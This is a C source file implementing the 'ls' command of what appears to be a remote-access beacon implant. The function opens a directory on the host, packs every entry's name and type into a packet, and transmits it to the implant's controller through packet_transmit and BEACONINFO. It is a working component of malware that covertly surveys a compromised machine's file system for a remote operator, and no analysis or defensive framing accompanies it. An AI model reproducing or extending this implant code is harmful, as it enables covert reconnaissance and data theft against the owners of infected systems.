#include "command_ls.h"


int command_ls(BEACONINFO *beaconInfo, char *path)
{
    DIR *dir;
    struct dirent *entry;

    struct packet_struct *packet = packet_create(COMMAND_LS);

    packet_add_uint32(packet, strlen(path));
    packet_add_bytes(packet, path, strlen(path));
    // 打开目录
    dir = opendir(path);

    if (dir == NULL)
    {
        DLX(2, printf("\tError opening directory\n"));
        packet_add_uint32(packet, -1); // for error

        goto transmit;
    }
    else
    {
        packet_add_uint32(packet, 0); // for sucess
    }

    while ((entry = readdir(dir)) != NULL)
    {
        // DLX(2,printf("\t%s\n", entry->d_name));
        packet_add_uint16(packet, strlen(entry->d_name));
        packet_add_uint16(packet, entry->d_type);
        packet_add_bytes(packet, entry->d_name, strlen(entry->d_name));
    }

    closedir(dir);
transmit:
    packet_transmit(beaconInfo, packet);
    return 0;
}